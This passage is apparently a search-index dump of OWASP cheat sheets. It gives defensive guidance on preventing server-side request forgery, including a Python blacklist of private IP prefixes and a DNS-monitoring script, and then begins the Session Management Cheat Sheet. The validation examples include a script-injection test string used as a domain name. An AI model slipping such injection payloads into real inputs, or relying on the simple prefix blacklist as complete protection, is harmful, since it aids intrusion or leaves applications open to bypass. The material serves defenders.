The Firewall component, as a specific device or using the one provided within the operating system, will be used here to define the legitimate flows. In the schema below, a Firewall component is leveraged to limit the application's access, and in turn, limit the impact of an application vulnerable to SSRF: Network segregation (see this set of implementation advices ) can also be leveraged and is highly recommended in order to block illegitimate calls directly at network level itself . Case 2 - Application can send requests to ANY external IP address or domain name \u00b6 This case happens when a user can control a URL to an External resource and the application makes a request to this URL (e.g. in case of WebHooks ). Whitelist cannot be used here because the list of IPs/domains is often unknown upfront and is dynamically changing. In this scenario, External refers to any IP that doesn't belong to the internal network, and should be reached by going over the public internet. Thus, the call from the Vulnerable Application : Is NOT targeting one of the IP/domain located inside the company's global network. Uses a convention defined between the VulnerableApplication and the expected IP/domain in order to prove that the call has been legitimately initiated. Challenges in blocking URLs at application layer \u00b6 Based on the business requirements of the above mentioned applications, the whitelist approach is not a valid solution. Despite knowing that the blacklist approach is not an impenetrable wall, it is the best solution in this scenario. It is informing the application what it should not do. Here is why filtering URLs is hard at the Application layer: It implies that the application must be able to detect, at the code level, that the provided IP (V4 + V6) is not part of the official private networks ranges including also localhost and IPv4/v6 Link-Local addresses. Not every SDK provides a built-in feature for this kind of verification, and leaves the handling up to the developer to understand all of its pitfalls and possible values, which makes it a demanding task. Same remark for domain name: The company must maintain a list of all internal domain names and provide a centralized service to allow an application to verify if a provided domain name is an internal one. For this verification, an internal DNS resolver can be queried by the application but this internal DNS resolver must not resolve external domain names. Available protections \u00b6 Taking into consideration the same assumption in the following example for the following sections. Application layer \u00b6 Like for the case n\u00b01 , it is assumed that the IP Address or domain name is required to create the request that will be sent to the TargetApplication . The first validation on the input data presented in the case n\u00b01 on the 3 types of data will be the same for this case BUT the second validation will differ . Indeed, here we must use the blacklist approach. Regarding the proof of legitimacy of the request : The TargetedApplication that will receive the request must generate a random token (ex: alphanumeric of 20 characters) that is expected to be passed by the caller (in body via a parameter for which the name is also defined by the application itself and only allow characters set [a-z]{1,10} ) to perform a valid request. The receiving endpoint must only accept HTTP POST requests. Validation flow (if one the validation steps fail then the request is rejected): The application will receive the IP address or domain name of the TargetedApplication and it will apply the first validation on the input data using the libraries/regex mentioned in this section . The second validation will be applied against the IP address or domain name of the TargetedApplication using the following blacklist approach: For IP address: The application will verify that it is a public one (see the hint provided in the next paragraph with the python code sample). For domain name: 1. The application will verify that it is a public one by trying to resolve the domain name against the DNS resolver that will only resolve internal domain name. Here, it must return a response indicating that it do not know the provided domain because the expected value received must be a public domain. 2. To prevent the DNS pinning attack described in this document , the application will retrieve all the IP addresses behind the domain name provided (taking records A + AAAA for IPv4 + IPv6) and it will apply the same verification described in the previous point about IP addresses. The application will receive the protocol to use for the request via a dedicated input parameter for which it will verify the value against an allowed list of protocols ( HTTP or HTTPS ). The application will receive the parameter name for the token to pass to the TargetedApplication via a dedicated input parameter for which it will only allow the characters set [a-z]{1,10} . The application will receive the token itself via a dedicated input parameter for which it will only allow the characters set [a-zA-Z0-9]{20} . The application will receive and validate (from a security point of view) any business data needed to perform a valid call. The application will build the HTTP POST request using only validated informations and will send it ( don't forget to disable the support for redirection in the web client used ). Hints for the step 2 regarding the verification on an IP address: As mentioned above, not every SDK provide a built-in feature to verify if an IP (V4 + V6) is private/public. So, the following approach can be used based on a blacklist composed of the private IP ranges ( example is given in python in order to be easy to understand and portable to others technologies ) : def is_private_ip ( ip_address ): is_private = False \"\"\" Determine if a IP address provided is a private one. Return TRUE if it's the case, FALSE otherwise. \"\"\" # Build the list of IP prefix for V4 and V6 addresses ip_prefix = [] # Add prefix for loopback addresses ip_prefix . append ( \"127.\" ) ip_prefix . append ( \"0.\" ) # Add IP V4 prefix for private addresses # See https://en.wikipedia.org/wiki/Private_network ip_prefix . append ( \"10.\" ) ip_prefix . append ( \"172.16.\" ) ip_prefix . append ( \"172.17.\" ) ip_prefix . append ( \"172.18.\" ) ip_prefix . append ( \"172.19.\" ) ip_prefix . append ( \"172.20.\" ) ip_prefix . append ( \"172.21.\" ) ip_prefix . append ( \"172.22.\" ) ip_prefix . append ( \"172.23.\" ) ip_prefix . append ( \"172.24.\" ) ip_prefix . append ( \"172.25.\" ) ip_prefix . append ( \"172.26.\" ) ip_prefix . append ( \"172.27.\" ) ip_prefix . append ( \"172.28.\" ) ip_prefix . append ( \"172.29.\" ) ip_prefix . append ( \"172.30.\" ) ip_prefix . append ( \"172.31.\" ) ip_prefix . append ( \"192.168.\" ) ip_prefix . append ( \"169.254.\" ) # Add IP V6 prefix for private addresses # See https://en.wikipedia.org/wiki/Unique_local_address # See https://en.wikipedia.org/wiki/Private_network # See https://simpledns.com/private-ipv6 ip_prefix . append ( \"fc\" ) ip_prefix . append ( \"fd\" ) ip_prefix . append ( \"fe\" ) ip_prefix . append ( \"ff\" ) ip_prefix . append ( \"::1\" ) # Verify the provided IP address # Remove whitespace characters from the beginning/end of the string # and convert it to lower case # Lower case is for preventing any IPV6 case bypass using mixed case # depending on the source used to get the IP address ip_to_verify = ip_address . strip () . lower () # Perform the check against the list of prefix for prefix in ip_prefix : if ip_to_verify . startswith ( prefix ): is_private = True break return is_private Network layer \u00b6 Similar to the following section . IMDSv2 in AWS \u00b6 In cloud environments SSRF is often used to access and steal credentials and access tokens from metadata services (e.g. AWS Instance Metadata Service, Azure Instance Metadata Service, GCP metadata server). IMDSv2 is an additional defence-in-depth mechanism for AWS that mitigates some of the instances of SSRF. To leverage this protection migrate to IMDSv2 and disable old IMDSv1. Check out AWS documentation for more details. Semgrep Rules \u00b6 Semgrep is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase. Checkout the Semgrep rule for SSRF to identify/investigate for SSRF vulnerabilities in Java https://semgrep.dev/salecharohit:owasp_java_ssrf References \u00b6 Online version of the SSRF bible (PDF version is used in this cheat sheet). Article about Bypassing SSRF Protection . Articles about SSRF attacks: Part 1 , part 2 and part 3 . Article about IMDSv2 Tools and code used for schemas \u00b6 Mermaid Online Editor and Mermaid documentation . Draw.io Online Editor . Mermaid code for SSRF common flow (printscreen are used to capture PNG image inserted into this cheat sheet): sequenceDiagram participant Attacker participant VulnerableApplication participant TargetedApplication Attacker->>VulnerableApplication: Crafted HTTP request VulnerableApplication->>TargetedApplication: Request (HTTP, FTP...) Note left of TargetedApplication: Use payload included<br>into the request to<br>VulnerableApplication TargetedApplication->>VulnerableApplication: Response VulnerableApplication->>Attacker: Response Note left of VulnerableApplication: Include response<br>from the<br>TargetedApplication Draw.io schema XML code for the \" case 1 for network layer protection about flows that we want to prevent \" schema (printscreen are used to capture PNG image inserted into this cheat sheet).","title":"Server Side Request Forgery Prevention"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#server-side-request-forgery-prevention-cheat-sheet","text":"","title":"Server-Side Request Forgery Prevention Cheat Sheet"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#introduction","text":"The objective of the cheat sheet is to provide advices regarding the protection against Server Side Request Forgery (SSRF) attack. This cheat sheet will focus on the defensive point of view and will not explain how to perform this attack. This talk from the security researcher Orange Tsai as well as this document provide techniques on how to perform this kind of attack.","title":"Introduction"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#context","text":"SSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself. One of the enablers for this vector is the mishandling of URLs, as showcased in the following examples: Image on external server ( e.g. user enters image URL of their avatar for the application to download and use). Custom WebHook (user have to specify WebHook handlers or Callback URLs). Internal requests to interact with another service to serve a certain functionality. Most of the times, user data is sent along to be processed, and if badly handled, can perform certain injection attacks.","title":"Context"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#overview-of-a-ssrf-common-flow","text":"Notes: SSRF is not limited to the HTTP protocol, despite the fact that in general the first request leverages it, yet the second request is performed by the application itself, and thus it could be using different protocols ( e.g. FTP, SMB, SMTP, etc.) and schemes ( e.g. file:// , phar:// , gopher:// , data:// , dict:// , etc.). The protocol/scheme usage is highly dependent on the application's requirements. If the application is vulnerable to XML eXternal Entity (XXE) injection then it can be exploited to perform a SSRF attack , take a look at the XXE cheat sheet to learn how to prevent the exposure to XXE.","title":"Overview of a SSRF common flow"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#cases","text":"Depending on the application's functionality and requirements, there are two basic cases in which SSRF can happen: Application can send request only to identified and trusted applications : Case when whitelist approach is available. Application can send requests to ANY external IP address or domain name : Case when whitelist approach is not available. Because these two cases are very different, this cheat sheet will describe defences against them separately.","title":"Cases"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#case-1-application-can-send-request-only-to-identified-and-trusted-applications","text":"Sometimes, an application need to perform request to another application, often located on another network, to perform a specific task. Depending of the business case, it can happen that information from the user are needed to perform the action.","title":"Case 1 - Application can send request only to identified and trusted applications"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#example","text":"Take the example of a web application that receives and uses personal information from a user, such as their firstname/lastname/birthdate to create a profile in an internal HR system. By design, that web application will have to communicate using a protocol that the HR system understands in order to process that data. Basically, the user cannot reach the HR system directly, but, if the web application in charge of receiving the user information is vulnerable to SSRF then the user can leverage it to access the HR system. The user leverages the web application as a proxy to the HR system. The whitelist approach is a viable option in this case since the internal application called by the VulnerableApplication is clearly identified in the technical/business flow. It can be stated that the required calls will only be targeted between those identified and trusted applications.","title":"Example"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#available-protections","text":"Several protective measures are possible at the Application and Network layers. In order to apply the defense in depth principle, both layers will be hardened against such attacks.","title":"Available protections"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#application-layer","text":"The first level of protection that comes to mind is Input validation . Based on that point, the following question comes to mind: How to perform this input validation? As Orange Tsai shows in his talk , depending on the programming language used, parsers can be abused. One possible countermeasure is to apply the whitelisting approach when input validation is used because, most of the time, the format of the information expected from the user is globally know. The request sent to the internal application will be based on the following information: String containing business data. IP address (V4 or V6). Domain name. URL. Note: Disable the support for the following of the redirection in your web client in order to prevent the bypass of the input validation described in the section Exploitation tricks > Bypassing restrictions > Input validation > Unsafe redirect of this document .","title":"Application layer"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#string","text":"In the context of SSRF, checks can be put in place to ensure that the string respects the business/technical format expected. A regex can be used to ensure that data received is valid from a security point of view if the input data have a simple format ( e.g. token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the string object because regex for complex formats are difficult to maintain and are highly error-prone. User input is assumed to be non-network related and consists of the user's personal information. Example: //Regex validation for a data having a simple format if ( Pattern . matches ( \"[a-zA-Z0-9\\\\s\\\\-]{1,50}\" , userInput )){ //Continue the processing because the input data is valid } else { //Stop the processing and reject the request }","title":"String"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#ip-address","text":"In the context of SSRF, there are 2 possible validations to perform: Ensure that the data provided is a valid IP V4 or V6 address. Ensure that the IP address provided belongs to one of the IP addresses of the identified and trusted applications. The first layer of validation can be applied using libraries that ensure the security of the IP address format, based on the technology used (library option is proposed here in order to delegate the managing of the IP address format and leverage battle tested validation function): Verification of the proposed libraries has been performed regarding the exposure to bypasses (Hex, Octal, Dword, URL and Mixed encoding) described in this article . JAVA: Method InetAddressValidator.isValid from the Apache Commons Validator library. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. .NET : Method IPAddress.TryParse from the SDK. It is exposed to bypass using Hex, Octal, Dword and Mixed encoding but NOT the URL encoding. As whitelisting is used here, any bypass tentative will be blocked during the comparison against the allowed list of IP addresses. JavaScript : Library ip-address . It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Python : Module ipaddress from the SDK. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Ruby : Class IPAddr from the SDK. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Use the output value of the method/library as the IP address to compare against the whitelist. After ensuring the validity of the incoming IP address, the second layer of validation is applied. A whitelist is created after determining all the IP addresses (v4 and v6 in order to avoid bypasses) of the identified and trusted applications. The valid IP is cross checked with that list to ensure its communication with the internal application (string strict comparison with case sensitive).","title":"IP address"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#domain-name","text":"In the attempt of validating domain names, it is apparent to do a DNS resolution in order to verify the existence of the domain. In general, it is not a bad idea, yet it opens up the application to attacks depending on the configuration used regarding the DNS servers used for the domain name resolution: It can disclose information to external DNS resolvers. It can be used by an attacker to bind a legit domain name to an internal IP address. See the section Exploitation tricks > Bypassing restrictions > Input validation > DNS pinning of this document . It can be used, by an attacker, to deliver a malicious payload to the internal DNS resolvers as well as to the API (SDK or third-party) used by the application to handle the DNS communication and then, potentially, trigger a vulnerability in one of these components. In the context of SSRF, there are 2 validations to perform: Ensure that the data provided is a valid domain name. Ensure that the domain name provided belongs to one of the domain names of the identified and trusted applications (the whitelisting comes to action here). Similar to the IP address validation, the first layer of validation can be applied using libraries that ensure the security of the domain name format, based on the technology used (library option is proposed here in order to delegate the managing of the domain name format and leverage battle tested validation function): Verification of the proposed libraries has been performed to ensure that the proposed functions do not perform any DNS resolution query. JAVA: Method DomainValidator.isValid from the Apache Commons Validator library. .NET : Method Uri.CheckHostName from the SDK. JavaScript : Library is-valid-domain . Python : Module validators.domain . Ruby : No valid dedicated gem has been found. domainator , public_suffix and addressable has been tested but unfortunately they all consider <script>alert(1)</script>.owasp.org as a valid domain name. This regex, taken from here , can be used: ^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$ Example of execution of the proposed regex for Ruby: domain_names = [ \"owasp.org\" , \"owasp-test.org\" , \"doc-test.owasp.org\" , \"doc.owasp.org\" , \"<script>alert(1)</script>\" , \"<script>alert(1)</script>.owasp.org\" ] domain_names . each { | domain_name | if ( domain_name =~ /^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$/ ) puts \"[i] #{ domain_name } is VALID\" else puts \"[!] #{ domain_name } is INVALID\" end } $ ruby test.rb [ i ] owasp.org is VALID [ i ] owasp-test.org is VALID [ i ] doc-test.owasp.org is VALID [ i ] doc.owasp.org is VALID [ ! ] <script>alert ( 1 ) </script> is INVALID [ ! ] <script>alert ( 1 ) </script>.owasp.org is INVALID After ensuring the validity of the incoming domain name, the second layer of validation is applied: Build a whitelist with all the domain names of every identified and trusted applications. Verify that the domain name received is part of this whitelist (string strict comparison with case sensitive). Unfortunately here, the application is still vulnerable to the DNS pinning bypass mentioned in this document . Indeed, a DNS resolution will be made when the business code will be executed. To address that issue, the following action must be taken in addition of the validation on the domain name: Ensure that the domains that are part of your organization are resolved by your internal DNS server first in the chains of DNS resolvers. Monitor the domains whitelist in order to detect when any of them resolves to a/an: Local IP address (V4 + V6). Internal IP of your organization (expected to be in private IP ranges) for the domain that are not part of your organization. The following Python3 script can be used, as a starting point, for the monitoring mentioned above: # Dependencies: pip install ipaddress dnspython import ipaddress import dns.resolver # Configure the whitelist to check DOMAINS_WHITELIST = [ \"owasp.org\" , \"labslinux\" ] # Configure the DNS resolver to use for all DNS queries DNS_RESOLVER = dns . resolver . Resolver () DNS_RESOLVER . nameservers = [ \"1.1.1.1\" ] def verify_dns_records ( domain , records , type ): \"\"\" Verify if one of the DNS records resolve to a non public IP address. Return a boolean indicating if any error has been detected. \"\"\" error_detected = False if records is not None : for record in records : value = record . to_text () . strip () try : ip = ipaddress . ip_address ( value ) # See https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global if not ip . is_global : print ( \"[!] DNS record type ' %s ' for domain name ' %s ' resolve to a non public IP address ' %s ' ! \" % (type, domain, value)) error_detected = True except ValueError : error_detected = True print ( \"[!] ' %s ' is not valid IP address!\" % value ) return error_detected def check (): \"\"\" Perform the check of the whitelist of domains. Return a boolean indicating if any error has been detected. \"\"\" error_detected = False for domain in DOMAINS_WHITELIST : # Get the IPs of the current domain # See https://en.wikipedia.org/wiki/List_of_DNS_record_types try : # A = IPv4 address record ip_v4_records = DNS_RESOLVER . query ( domain , \"A\" ) except Exception as e : ip_v4_records = None print ( \"[i] Cannot get A record for domain ' %s ': %s \\n \" % ( domain , e )) try : # AAAA = IPv6 address record ip_v6_records = DNS_RESOLVER . query ( domain , \"AAAA\" ) except Exception as e : ip_v6_records = None print ( \"[i] Cannot get AAAA record for domain ' %s ': %s \\n \" % ( domain , e )) # Verify the IPs obtained if verify_dns_records ( domain , ip_v4_records , \"A\" ) or verify_dns_records ( domain , ip_v6_records , \"AAAA\" ): error_detected = True return error_detected if __name__ == \"__main__\" : if check (): exit ( 1 ) else : exit ( 0 )","title":"Domain name"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#url","text":"Do not accept complete URLs from the user because URL are difficult to validate and the parser can be abused depending on the technology used as showcased by the following talk of Orange Tsai . If network related information is really needed then only accept a valid IP address or domain name.","title":"URL"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#network-layer","text":"The objective of the Network layer security is to prevent the VulnerableApplication from performing calls to arbitrary applications. Only allowed routes will be available for this application in order to limit its network access to only those that it should communicate with. The Firewall component, as a specific device or using the one provided within the operating system, will be used here to define the legitimate flows. In the schema below, a Firewall component is leveraged to limit the application's access, and in turn, limit the impact of an application vulnerable to SSRF: Network segregation (see this set of implementation advices ) can also be leveraged and is highly recommended in order to block illegitimate calls directly at network level itself .","title":"Network layer"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#case-2-application-can-send-requests-to-any-external-ip-address-or-domain-name","text":"This case happens when a user can control a URL to an External resource and the application makes a request to this URL (e.g. in case of WebHooks ). Whitelist cannot be used here because the list of IPs/domains is often unknown upfront and is dynamically changing. In this scenario, External refers to any IP that doesn't belong to the internal network, and should be reached by going over the public internet. Thus, the call from the Vulnerable Application : Is NOT targeting one of the IP/domain located inside the company's global network. Uses a convention defined between the VulnerableApplication and the expected IP/domain in order to prove that the call has been legitimately initiated.","title":"Case 2 - Application can send requests to ANY external IP address or domain name"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#challenges-in-blocking-urls-at-application-layer","text":"Based on the business requirements of the above mentioned applications, the whitelist approach is not a valid solution. Despite knowing that the blacklist approach is not an impenetrable wall, it is the best solution in this scenario. It is informing the application what it should not do. Here is why filtering URLs is hard at the Application layer: It implies that the application must be able to detect, at the code level, that the provided IP (V4 + V6) is not part of the official private networks ranges including also localhost and IPv4/v6 Link-Local addresses. Not every SDK provides a built-in feature for this kind of verification, and leaves the handling up to the developer to understand all of its pitfalls and possible values, which makes it a demanding task. Same remark for domain name: The company must maintain a list of all internal domain names and provide a centralized service to allow an application to verify if a provided domain name is an internal one. For this verification, an internal DNS resolver can be queried by the application but this internal DNS resolver must not resolve external domain names.","title":"Challenges in blocking URLs at application layer"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#available-protections_1","text":"Taking into consideration the same assumption in the following example for the following sections.","title":"Available protections"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#application-layer_1","text":"Like for the case n\u00b01 , it is assumed that the IP Address or domain name is required to create the request that will be sent to the TargetApplication . The first validation on the input data presented in the case n\u00b01 on the 3 types of data will be the same for this case BUT the second validation will differ . Indeed, here we must use the blacklist approach. Regarding the proof of legitimacy of the request : The TargetedApplication that will receive the request must generate a random token (ex: alphanumeric of 20 characters) that is expected to be passed by the caller (in body via a parameter for which the name is also defined by the application itself and only allow characters set [a-z]{1,10} ) to perform a valid request. The receiving endpoint must only accept HTTP POST requests. Validation flow (if one the validation steps fail then the request is rejected): The application will receive the IP address or domain name of the TargetedApplication and it will apply the first validation on the input data using the libraries/regex mentioned in this section . The second validation will be applied against the IP address or domain name of the TargetedApplication using the following blacklist approach: For IP address: The application will verify that it is a public one (see the hint provided in the next paragraph with the python code sample). For domain name: 1. The application will verify that it is a public one by trying to resolve the domain name against the DNS resolver that will only resolve internal domain name. Here, it must return a response indicating that it do not know the provided domain because the expected value received must be a public domain. 2. To prevent the DNS pinning attack described in this document , the application will retrieve all the IP addresses behind the domain name provided (taking records A + AAAA for IPv4 + IPv6) and it will apply the same verification described in the previous point about IP addresses. The application will receive the protocol to use for the request via a dedicated input parameter for which it will verify the value against an allowed list of protocols ( HTTP or HTTPS ). The application will receive the parameter name for the token to pass to the TargetedApplication via a dedicated input parameter for which it will only allow the characters set [a-z]{1,10} . The application will receive the token itself via a dedicated input parameter for which it will only allow the characters set [a-zA-Z0-9]{20} . The application will receive and validate (from a security point of view) any business data needed to perform a valid call. The application will build the HTTP POST request using only validated informations and will send it ( don't forget to disable the support for redirection in the web client used ). Hints for the step 2 regarding the verification on an IP address: As mentioned above, not every SDK provide a built-in feature to verify if an IP (V4 + V6) is private/public. So, the following approach can be used based on a blacklist composed of the private IP ranges ( example is given in python in order to be easy to understand and portable to others technologies ) : def is_private_ip ( ip_address ): is_private = False \"\"\" Determine if a IP address provided is a private one. Return TRUE if it's the case, FALSE otherwise. \"\"\" # Build the list of IP prefix for V4 and V6 addresses ip_prefix = [] # Add prefix for loopback addresses ip_prefix . append ( \"127.\" ) ip_prefix . append ( \"0.\" ) # Add IP V4 prefix for private addresses # See https://en.wikipedia.org/wiki/Private_network ip_prefix . append ( \"10.\" ) ip_prefix . append ( \"172.16.\" ) ip_prefix . append ( \"172.17.\" ) ip_prefix . append ( \"172.18.\" ) ip_prefix . append ( \"172.19.\" ) ip_prefix . append ( \"172.20.\" ) ip_prefix . append ( \"172.21.\" ) ip_prefix . append ( \"172.22.\" ) ip_prefix . append ( \"172.23.\" ) ip_prefix . append ( \"172.24.\" ) ip_prefix . append ( \"172.25.\" ) ip_prefix . append ( \"172.26.\" ) ip_prefix . append ( \"172.27.\" ) ip_prefix . append ( \"172.28.\" ) ip_prefix . append ( \"172.29.\" ) ip_prefix . append ( \"172.30.\" ) ip_prefix . append ( \"172.31.\" ) ip_prefix . append ( \"192.168.\" ) ip_prefix . append ( \"169.254.\" ) # Add IP V6 prefix for private addresses # See https://en.wikipedia.org/wiki/Unique_local_address # See https://en.wikipedia.org/wiki/Private_network # See https://simpledns.com/private-ipv6 ip_prefix . append ( \"fc\" ) ip_prefix . append ( \"fd\" ) ip_prefix . append ( \"fe\" ) ip_prefix . append ( \"ff\" ) ip_prefix . append ( \"::1\" ) # Verify the provided IP address # Remove whitespace characters from the beginning/end of the string # and convert it to lower case # Lower case is for preventing any IPV6 case bypass using mixed case # depending on the source used to get the IP address ip_to_verify = ip_address . strip () . lower () # Perform the check against the list of prefix for prefix in ip_prefix : if ip_to_verify . startswith ( prefix ): is_private = True break return is_private","title":"Application layer"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#network-layer_1","text":"Similar to the following section .","title":"Network layer"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#imdsv2-in-aws","text":"In cloud environments SSRF is often used to access and steal credentials and access tokens from metadata services (e.g. AWS Instance Metadata Service, Azure Instance Metadata Service, GCP metadata server). IMDSv2 is an additional defence-in-depth mechanism for AWS that mitigates some of the instances of SSRF. To leverage this protection migrate to IMDSv2 and disable old IMDSv1. Check out AWS documentation for more details.","title":"IMDSv2 in AWS"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#semgrep-rules","text":"Semgrep is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase. Checkout the Semgrep rule for SSRF to identify/investigate for SSRF vulnerabilities in Java https://semgrep.dev/salecharohit:owasp_java_ssrf","title":"Semgrep Rules"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#references","text":"Online version of the SSRF bible (PDF version is used in this cheat sheet). Article about Bypassing SSRF Protection . Articles about SSRF attacks: Part 1 , part 2 and part 3 . Article about IMDSv2","title":"References"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#tools-and-code-used-for-schemas","text":"Mermaid Online Editor and Mermaid documentation . Draw.io Online Editor . Mermaid code for SSRF common flow (printscreen are used to capture PNG image inserted into this cheat sheet): sequenceDiagram participant Attacker participant VulnerableApplication participant TargetedApplication Attacker->>VulnerableApplication: Crafted HTTP request VulnerableApplication->>TargetedApplication: Request (HTTP, FTP...) Note left of TargetedApplication: Use payload included<br>into the request to<br>VulnerableApplication TargetedApplication->>VulnerableApplication: Response VulnerableApplication->>Attacker: Response Note left of VulnerableApplication: Include response<br>from the<br>TargetedApplication Draw.io schema XML code for the \" case 1 for network layer protection about flows that we want to prevent \" schema (printscreen are used to capture PNG image inserted into this cheat sheet).","title":"Tools and code used for schemas"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html","text":"Session Management Cheat Sheet \u00b6 Introduction \u00b6 Web Authentication, Session Management, and Access Control : A web session is a sequence of network HTTP request and response transactions associated with the same user. Modern and complex web applications require the retaining of information or status about each user for the duration of multiple requests. Therefore, sessions provide the ability to establish variables \u2013 such as access rights and localization settings \u2013 which will apply to each and every interaction a user has with the web application for the duration of the session. Web applications can create sessions to keep track of anonymous users after the very first user request. An example would be maintaining the user language preference. Additionally, web applications will make use of sessions once the user has authenticated. This ensures the ability to identify the user on any subsequent requests as well as being able to apply security access controls, authorized access to the user private data, and to increase the usability of the application. Therefore, current web applications can provide session capabilities both pre and post authentication. Once an authenticated session has been established, the session ID (or token) is temporarily equivalent to the strongest authentication method used by the application, such as username and password, passphrases, one-time passwords (OTP), client-based digital certificates, smartcards, or biometrics (such as fingerprint or eye retina). See the OWASP Authentication Cheat Sheet . HTTP is a stateless protocol ( RFC2616 section 5), where each request and response pair is independent of other web interactions. Therefore, in order to introduce the concept of a session, it is required to implement session management capabilities that link both the authentication and access control (or authorization) modules commonly available in web applications: The session ID or token binds the user authentication credentials (in the form of a user session) to the user HTTP traffic and the appropriate access controls enforced by the web application. The complexity of these three components (authentication, session management, and access control) in modern web applications, plus the fact that its implementation and binding resides on the web developer's hands (as web development frameworks do not provide strict relationships between these modules), makes the implementation of a secure session management module very challenging. The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Attackers can perform two types of session hijacking attacks, targeted or generic. In a targeted attack, the attacker's goal is to impersonate a specific (or privileged) web application victim user. For generic attacks, the attacker's goal is to impersonate (or get access as) any valid or legitimate user in the web application. Session ID Properties \u00b6 In order to keep the authenticated state and track the users progress within the web application, applications provide users with a session identifier (session ID or token) that is assigned at session creation time, and is shared and exchanged by the user and the web application for the duration of the session (it is sent on every HTTP request). The session ID is a name=value pair. With the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) must meet the following properties. Session ID Name Fingerprinting \u00b6 The name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID. The session ID names used by the most common web application development frameworks can be easily fingerprinted , such as PHPSESSID (PHP), JSESSIONID (J2EE), CFID & CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application. It is recommended to change the default session ID name of the web development framework to a generic name, such as id . Session ID Length \u00b6 The session ID must be long enough to prevent brute force attacks, where an attacker can go through the whole range of ID values and verify the existence of valid sessions. The session ID length must be at least 128 bits (16 bytes) . NOTE : The session ID length of 128 bits is provided as a reference based on the assumptions made on the next section Session ID Entropy . However, this number should not be considered as an absolute minimum value, as other implementation factors might influence its strength. For example, there are well-known implementations, such as Microsoft ASP.NET session IDs : \" The ASP .NET session identifier is a randomly generated number encoded into a 24-character string consisting of lowercase characters from a to z and numbers from 0 to 5 \". It can provide a very good effective entropy, and as a result, can be considered long enough to avoid guessing or brute force attacks. Session ID Entropy \u00b6 The session ID must be unpredictable (random enough) to prevent guessing attacks, where an attacker is able to guess or predict the ID of a valid session through statistical analysis techniques. For this purpose, a good CSPRNG (Cryptographically Secure Pseudorandom Number Generator) must be used. The session ID value must provide at least 64 bits of entropy (if a good PRNG is used, this value is estimated to be half the length of the session ID). Additionally, a random session ID is not enough; it must also be unique to avoid duplicated IDs. A random session ID must not already exist in the current session ID space. NOTE : The session ID entropy is really affected by other external and difficult to measure factors, such as the number of concurrent active sessions the web application commonly has, the absolute session expiration timeout, the amount of session ID guesses per second the attacker can make and the target web application can support, etc. If a session ID with an entropy of 64 bits is used, it will take an attacker at least 292 years to successfully guess a valid session ID, assuming the attacker can try 10,000 guesses per second with 100,000 valid simultaneous sessions available in the web application. More information here . Session ID Content (or Value) \u00b6 The session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application. The session ID must simply be an identifier on the client side, and its value must never include sensitive information (or PII ). The meaning and business or application logic associated with the session ID must be stored on the server side, and specifically, in session objects or in a session management database or repository. The stored information can include the client IP address, User-Agent, e-mail, username, user ID, role, privilege level, access rights, language preferences, account ID, current state, last login, session timeouts, and other internal session details. If the session objects and properties contain sensitive information, such as credit card numbers, it is required to duly encrypt and protect the session management repository. It is recommended to create cryptographically strong session IDs through the usage of cryptographic hash functions such as SHA256. Session Management Implementation \u00b6 The session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID. There are multiple mechanisms available in HTTP to maintain session state within web applications, such as 